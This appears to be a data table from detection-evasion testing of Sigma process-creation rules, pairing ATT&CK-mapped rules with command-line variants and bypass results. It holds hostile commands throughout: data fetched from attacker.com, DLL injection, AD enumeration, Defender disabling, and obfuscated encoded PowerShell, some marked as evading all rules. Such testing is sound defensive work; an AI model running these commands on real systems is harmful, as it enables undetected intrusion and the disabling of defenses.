Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		copy DataSvcUtil.exe C:\Users\Public\ ot\_suspicious.exe && C:\Users\Public\ ot\_suspicious.exe /uri:http://attacker.com/data /out:C:\Windows\Temp\proxy.cs	FALSE	FALSE	FALSE	
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		"DataSvcUtil.exe ""/uri:http://attacker.com"" ""/out:C:\	emp\out.cs"" ""/in:C:\	emp\in.cs"""	FALSE	FALSE	FALSE	
t1218.002	proc_creation_win_control_panel_item	Control Panel Items	0ba863e6-def5-4e50-9cea-4dd8c7dc46a4	"reg.exe  add \""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs\"" /v \""Exploit\"" /t REG_SZ /d \""test.cpl\"""	"reg.exe add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs"" /v ""Exploit"" /t REG_SZ /d ""test.cpl"""	TRUE	FALSE	FALSE	Control Panel Items (0ba863e6-def5-4e50-9cea-4dd8c7dc46a4)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\akew4mzz\akew4mzz.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\fonvsqyp\fonvsqyp.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\oovpncgq\oovpncgq.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\ghrrmnny\ghrrmnny.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\w2lclvxd\w2lclvxd.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe   /out:C:\Windows\Temp\T1027.004.exe \""C:\AtomicRedTeam\atomics\T1027.004\src\calc.cs\"""	"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /out:C:\Windows\Temp\T1027.004.exe ""C:\AtomicRedTeam\atomics\T1027.004\src\calc.cs"""	TRUE	FALSE	FALSE	Csc.EXE Execution Form Potentially Suspicious Parent (b730a276-6b63-41b8-bcf8-55930c8fc6ee); Dynamic .NET Compilation Via Csc.EXE (dcaa3f04-70c3-427a-80b4-b870d73c94c4)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\bt33acch\bt33acch.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\yn0qecxv\yn0qecxv.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\rak0ws2b\rak0ws2b.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\trupfuaj\trupfuaj.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\j0crw4ts\j0crw4ts.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\jjaks1mb\jjaks1mb.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\sag2dimo\sag2dimo.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\wknmn4ou\wknmn4ou.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe   /out:\""C:\Users\thaim\AppData\Local\Temp\T1106.exe\"" /target:exe \""C:\AtomicRedTeam\atomics\T1106\src\CreateProcess.cs\"""	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /out:""C:\Users\thaim\AppData\Local\Temp\T1106.exe"" /target:exe ""C:\AtomicRedTeam\atomics\T1106\src\CreateProcess.cs"""	TRUE	FALSE	FALSE	Dynamic .NET Compilation Via Csc.EXE (dcaa3f04-70c3-427a-80b4-b870d73c94c4)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\aqdzmt0z\aqdzmt0z.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\4qvmfagk\4qvmfagk.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\pzj40z2i\pzj40z2i.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\4pk1n4ga\4pk1n4ga.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /r:System.EnterpriseServices.dll /out:C:\Users\thaim\AppData\Local\Temp\T1218.009.dll /target:library /keyfile:C:\Users\thaim\AppData\Local\Temp\key.snk C:\AtomicRedTeam\atomics\T1218.009\src\T1218.009.cs"	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe   /r:System.EnterpriseServices.dll /out:\""C:\Users\thaim\AppData\Local\Temp\T1218.009.dll\"" /target:library \""C:\AtomicRedTeam\atomics\T1218.009\src\T1218.009.cs\"""	"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /r:System.EnterpriseServices.dll /out:""C:\Users\thaim\AppData\Local\Temp\T1218.009.dll"" /target:library ""C:\AtomicRedTeam\atomics\T1218.009\src\T1218.009.cs"""	TRUE	FALSE	FALSE	Dynamic .NET Compilation Via Csc.EXE (dcaa3f04-70c3-427a-80b4-b870d73c94c4)
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\tvrp34ze\tvrp34ze.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\hw42xb34\hw42xb34.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\isx1z4su\isx1z4su.cmdline"""	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		copy csc.exe compiler.exe && compiler.exe /target:library /out:payload.dll C:\Windows\Temp\payload.cs	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		csc.exe /out:payload.exe C:\Temp\payload.cs	FALSE	FALSE	FALSE	
t1027.004	proc_creation_win_csc_susp_dynamic_compilation	Dynamic .NET Compilation Via Csc.EXE	dcaa3f04-70c3-427a-80b4-b870d73c94c4		csc.exe /out:update.exe C:\Windows\Tasks\update.cs	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		copy csvde.exe Update.exe && Update.exe /f C:\Users\Public\ad_export.csv	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		"csvde.exe ""-f"" C:\Users\Public\out.csv"	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_csvde_export	Active Directory Structure Export Via Csvde.EXE	e5d36acd-acb4-4c6f-a13f-9eb203d50099		csvde.exe -fC:\Users\Public\export.csv -i -f C:\Users\Public\real_export.csv	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe""  -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe""  -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"	TRUE	FALSE	FALSE	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - AdFind.EXE Execution (514e7e3e-b3b4-4a67-af60-be20f139198b)
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp"	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp"	TRUE	FALSE	FALSE	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - AdFind.EXE Execution (514e7e3e-b3b4-4a67-af60-be20f139198b)
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses"	"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses"	TRUE	FALSE	FALSE	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE (455b9d50-15a1-4b99-853f-8d37655a4c1b); PUA - AdFind.EXE Execution (514e7e3e-b3b4-4a67-af60-be20f139198b)
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		AdFind.exe   -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		adfind.exe -sc  admincountdmp	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		"adfind.exe -sc ""admincountdmp"""	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_pua_adfind_enumeration	PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE	455b9d50-15a1-4b99-853f-8d37655a4c1b		"adfind.exe -sc exch""""addresses"	FALSE	FALSE	FALSE	
t1087.002	proc_creation_win_sysinternals_adexplorer_execution	Active Directory Database Snapshot Via ADExplorer	9212f354-7775-4e28-9c9f-8f0a4544e664		ADExplorer.exe -snapshot -noexit	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"copy dctask64.exe not_suspicious.exe && not_suspicious.exe -executecmd64 ""whoami"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"dctask64.exe -""execute""""cmd64"" ""whoami"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_dctask64_arbitrary_command_and_dll_execution	ManageEngine Endpoint Central Dctask64.EXE Potential Abuse	6345b048-8441-43a7-9bed-541133633d7a		"dctask64.exe -executecmd64:""whoami"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		"""powershell.exe"" & {$mypid = (Start-Process notepad -PassThru).id mavinject $mypid /INJECTRUNNING \""""C:\AtomicRedTeam\atomics\T1055.001\src\x64\T1055.001.dll\"""" Stop-Process -processname notepad}"	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		"""cmd.exe"" /c mavinject.exe 1000 /INJECTRUNNING ""C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll"""	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		copy mavinject.exe not_mavinject.exe && not_mavinject.exe 1234 /INJECTRUNNING evil.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		mavinject.exe 1234 /INJECTRUNNING malicious.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		mavinject.exe 1234 /INJECTRUNNING\tevil.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		mavinject.exe 4321 -INJECTRUNNING payload.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		mavinject.exe 4321/INJECTRUNNING payload.dll	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_mavinject_process_injection	Mavinject Inject DLL Into Running Process	4f73421b-5a0b-4bbf-a892-5a7fb99bea66		"Start-Process -FilePath ""mavinject.exe"" -ArgumentList ""4321 /INJECTRUNNING payload.dll"" -ParentProcess (Get-Process -Name AppVClient -ErrorAction SilentlyContinue)"	FALSE	FALSE	FALSE	
t1055.001	proc_creation_win_lolbin_tracker	Potential DLL Injection Or Execution Using Tracker.exe	148431ce-4b70-403d-8525-fcc2993f29ea		Tracker.exe /ERRORREPORT:PROMPT /d malicious.dll /c calc.exe	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_defender_remove_context_menu	Windows Defender Context Menu Removed	b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b		"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		copy dism.exe sys_update.exe && sys_update.exe /Online /Disable-Feature /FeatureName:Windows-Defender	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		dism.exe -Online -Disable-Feature -FeatureName:Windows-Defender /Quiet /NoRestart	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9	Dism   /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet	Dism  /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet	TRUE	FALSE	FALSE	Dism Remove Online Package (43e32da2-fdd0-4156-90de-50dfd62636f9); Dism Remove Online Package (43e32da2-fdd0-4156-90de-50dfd62636f9)
t1562.001	proc_creation_win_logman_disable_eventlog	Suspicious Windows Trace ETW Session Tamper Via Logman.EXE	cd1f961e-0b96-436b-b7c6-38da4583ec00		logman2.exe start MyCustomTrace	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_mpcmdrun_remove_windows_defender_definition	Windows Defender Definition Files Removed	9719a8aa-401c-41af-8108-ced7ec9cd75c		MpCmdRun.exe /RemoveDefinitions /All	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		powershell.exe -EncodedCommand cwBFAHQALQBtAHAAcABSAEUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAHQAZQBzAHQA	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		powershell.exe -EncodedCommand JABhAD0AJwBTAGUAdAAtAE0AcAAnADsAJABiAD0AJwBQAHIAZQBmAGUAcgBlAG4AYwBlACcAOwBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiACQAYQAkAGIAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAB0AGUAcwB0ACIA	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious PowerShell Encoded Command Patterns (b9d9cc83-380b-4ba3-8d8f-60c0e7e2930c); PowerShell Base64 Encoded Invoke Keyword (6385697e-9f1b-40bd-8817-f4a91f40508e); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_base64_mppreference	Powershell Base64 Encoded MpPreference Cmdlet	c6fb44c6-71f5-49e6-9462-1425d328aee3		powershell.exe -EncodedCommand UwBgAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAdABlAHMAdAA=	TRUE	TRUE	FALSE	Suspicious Encoded PowerShell Command Line (ca2092a1-c273-4878-9b4b-0d60115bf5ea); Suspicious Execution of Powershell with Base64 (fb843269-508c-4b76-8b8d-88679db22ce7); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_disable_feature	Powershell Defender Disable Scan Feature	1ec65a5f-9473-4f12-97da-622044d6df21		"powershell.exe -Command ""S`e`t-MpPreference -DisableRealtimeMonitoring $true"""	TRUE	TRUE	FALSE	Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_disable_feature	Powershell Defender Disable Scan Feature	1ec65a5f-9473-4f12-97da-622044d6df21		"powershell.exe -Command ""Set-Alias -Name smp -Value Set-MpPreference; smp -DisableRealtimeMonitoring $true"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_disable_feature	Powershell Defender Disable Scan Feature	1ec65a5f-9473-4f12-97da-622044d6df21		"powershell.exe -Command ""Set-MpPreference -DisableRealtimeMonitoring 1"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpP`r`eference -ExclusionP`a`th 'C:\Temp'"""	TRUE	TRUE	FALSE	Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionP 'C:\Temp'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_defender_exclusion	Powershell Defender Exclusion	17769c90-230e-488b-a463-e05c08e9d48f		"powershell.exe -Command ""Add-MpPreference -ExclusionPath'C:\Temp'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		net stop WinDefend	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_powershell_disable_defender_av_security_monitoring	Disable Windows Defender AV Security Monitoring	a7ee1722-c3c5-aeff-3212-c777e4733217		powershell.exe Set-MpPreference -DisableB $true	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
